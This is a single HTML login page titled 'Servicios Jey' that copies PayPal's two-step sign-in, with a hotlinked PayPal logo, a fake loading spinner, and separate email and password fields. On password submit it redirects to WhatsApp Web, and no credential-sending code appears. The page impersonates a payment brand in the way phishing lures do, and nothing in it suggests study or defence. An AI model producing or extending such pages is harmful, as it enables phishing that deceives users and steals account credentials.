<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Servicios Jey — Login</title>
<meta name="description" content="Sign in to Servicios Jey">
<style>
  :root{
    --bg:#ffffff;
    --card:#ffffff;
    --ink:#111827;
    --muted:#6b7280;
    --line:#e6e9ef;
    --blue:#0b5bd3;
    --blue-ink:#fff;
    --shadow:0 18px 40px rgba(17,24,39,.10);
    --radius:26px;
    --radius-sm:14px;
    --font:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,Ubuntu,"Helvetica Neue",Arial,sans-serif;
  }
  *{box-sizing:border-box}
  html,body{height:100%}
  body{
    margin:0;background:var(--card);font-family:var(--font);color:var(--ink);
    -webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;
  }

  .wrap{min-height:100%;display:grid;grid-template-rows:1fr auto}
  .center{
    display:grid;align-items:start;justify-items:center;padding:16px 16px;
  }

  .card{
    position:relative;width:100%;max-width:520px;background:var(--card);
    border-radius:var(--radius);padding:20px 36px 24px;box-shadow:var(--shadow);
  }

  .brand{display:flex;justify-content:center;margin-bottom:20px}
  .brand img{height:75px;width:auto;object-fit:contain}

  .field{margin:38px 0 12px}
  .input{
    width:100%;height:65px;padding:16px;border:1px solid var(--line);border-radius:5px;
    font-size:16px;background:#fff;color:#5f5f5f;outline:0;transition:border-color .2s,box-shadow .2s;
  }
  .input::placeholder{color:#5f5f5f}
  .input:focus{border-color:var(--blue);box-shadow:0 0 0 4px rgba(11,91,211,.2)}

  .link{display:inline-block;margin:10px 0 18px;color:var(--blue);text-decoration:none;font-weight:600}
  .link:hover{text-decoration:underline}

  .btn{
    width:100%;display:inline-flex;align-items:center;justify-content:center;border:0;border-radius:999px;
    padding:14px 18px;font-size:16px;font-weight:800;cursor:pointer;transition:transform .02s,filter .2s,box-shadow .2s;
  }
  .btn:active{transform:translateY(1px)}
  .btn-primary{background:var(--blue);color:var(--blue-ink);box-shadow:0 8px 22px rgba(11,91,211,.28)}
  .btn-primary:hover{filter:brightness(.98)}
  .btn-outline{background:#fff;color:#111;border:2px solid #111}
  .btn-outline:hover{background:#f9fafb}

  .divider{
    display:grid;grid-template-columns:1fr auto 1fr;align-items:center;gap:12px;
    margin:18px 0;color:#98a2b3;font-weight:700;
  }
  .divider::before,.divider::after{content:"";height:1px;background:var(--line)}

  .hidden{display:none}

  /* Correo + Change alineados con pequeño espacio */
  .id-row{
    display:flex;align-items:center;justify-content:flex-start;gap:8px;
    font-size:16px;font-weight:700;margin:0; /* sin separación extra */
  }
  .id-row .change{color:var(--blue);font-weight:700;text-decoration:none}
  .id-row .change:hover{text-decoration:underline}

  /* Caja de password pegada al correo */
  #step-2 .field{margin:0 0 12px}

  /* Overlay de carga */
  .loading{
    position:absolute;inset:0;background:rgba(255,255,255,.92);display:none;
    align-items:center;justify-content:center;border-radius:var(--radius);animation:fadeIn .15s ease;
    z-index:1000;pointer-events:all;
  }
  .loading.active{display:flex}
  .spinner{
    width:84px;height:84px;border:4px solid rgba(11,91,211,.2);
    border-top-color:rgba(11,91,211,1);border-radius:50%;animation:spin 1s linear infinite;
  }
  @keyframes spin{to{transform:rotate(360deg)}}
  @keyframes fadeIn{from{opacity:0}to{opacity:1}}

  @media (max-width:480px){
    .card{padding:20px 18px;border-radius:22px}
    .brand img{height:65px}
    .btn{padding:13px 16px}
  }
</style>
</head>
<body>
  <div class="wrap">
    <main class="center" role="main">
      <section class="card" aria-label="Sign in form">
        <div class="brand">
          <img src="https://1000marcas.net/wp-content/uploads/2019/12/Paypal-Logo.jpg" alt="PayPal">
        </div>

        <div id="overlay" class="loading" aria-hidden="true">
          <div class="spinner" role="status" aria-label="Loading"></div>
        </div>

        <!-- Paso 1 -->
        <form id="step-1" autocomplete="on">
          <div class="field">
            <input id="identifier" class="input" type="text" placeholder="Email or mobile number" autocomplete="username" required>
          </div>
          <a href="#" id="forgot" class="link">Forgot email?</a>
          <button class="btn btn-primary" type="submit" id="btn-next">Next</button>

          <div class="divider" aria-hidden="true">or</div>
          <button class="btn btn-outline" type="button" id="btn-signup-1">Sign Up</button>
        </form>

        <!-- Paso 2 -->
        <form id="step-2" class="hidden" autocomplete="on">
          <div class="id-row">
            <div id="id-value">example@email.com</div>
            <a href="#" id="btn-change" class="change">Change</a>
          </div>
          <div class="field">
            <input id="password" class="input" type="password" placeholder="Enter your password" autocomplete="current-password" required>
          </div>
          <button class="btn btn-primary" type="submit" id="btn-login">Login</button>

          <div class="divider" aria-hidden="true">or</div>
          <button class="btn btn-outline" type="button" id="btn-signup-2">Sign Up</button>
        </form>
      </section>
    </main>
  </div>

<script>
  const step1 = document.getElementById('step-1');
  const step2 = document.getElementById('step-2');
  const overlay = document.getElementById('overlay');
  const idInput = document.getElementById('identifier');
  const idValue = document.getElementById('id-value');
  const pwdInput = document.getElementById('password');
  const changeBtn = document.getElementById('btn-change');

  // Ir de Paso 1 a Paso 2 con overlay
  step1.addEventListener('submit', (e)=>{
    e.preventDefault();
    const value = idInput.value.trim();
    if(!value){ idInput.focus(); return; }

    overlay.classList.add('active');

    setTimeout(()=>{
      overlay.classList.remove('active');
      idValue.textContent = value;
      step1.classList.add('hidden');
      step2.classList.remove('hidden');
      pwdInput.focus();

      // Forzamos el onsubmit para reemplazar cualquier handler viejo
      step2.onsubmit = (ev)=>{
        ev.preventDefault();
        window.location.assign('https://web.whatsapp.com/');
      };
    }, 1000);
  });

  // Volver al Paso 1
  changeBtn.addEventListener('click', (e)=>{
    e.preventDefault();
    pwdInput.value = '';
    step2.classList.add('hidden');
    step1.classList.remove('hidden');
    idInput.focus();
    // Limpia el onsubmit por si acaso
    step2.onsubmit = null;
  });

  // Botones Sign Up de ejemplo
  document.getElementById('btn-signup-1').addEventListener('click',()=>alert('Demo: Sign Up'));
  document.getElementById('btn-signup-2').addEventListener('click',()=>alert('Demo: Sign Up'));
</script>
</body>
</html>
